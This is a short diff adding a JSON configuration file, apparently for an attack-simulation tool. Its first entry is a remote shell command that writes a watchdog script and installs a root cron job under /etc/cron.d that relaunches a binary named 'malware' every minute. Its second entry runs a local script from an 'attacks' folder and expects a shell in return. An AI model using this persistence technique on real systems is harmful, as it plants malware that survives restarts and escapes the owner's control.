@@ -1,0 +1,8 @@
+[
+	{
+        "TYPE" : "REMOTE", "CMD_TYPE" : "CMD", "CMD" : "echo \"if [ -z \\$(pgrep malware) ]; then echo PERMANENT > /tmp/AAABBB && ##REP##/malware; fi\" > ##REP##/malscript.sh && chmod 755 ##REP##/malscript.sh && echo \"*/1 * * * * root ##REP##/malscript.sh\" > /etc/cron.d/malware\n", "REPLACE" : ["##REP##", "cwd"], "RECV" : "NONE"
+	},
+    {
+        "TYPE" : "LOCAL", "CMD_TYPE" : "FILE", "CMD" : "python attacks/ic/sleep.py", "RECV" : "shell"
+    }
+]
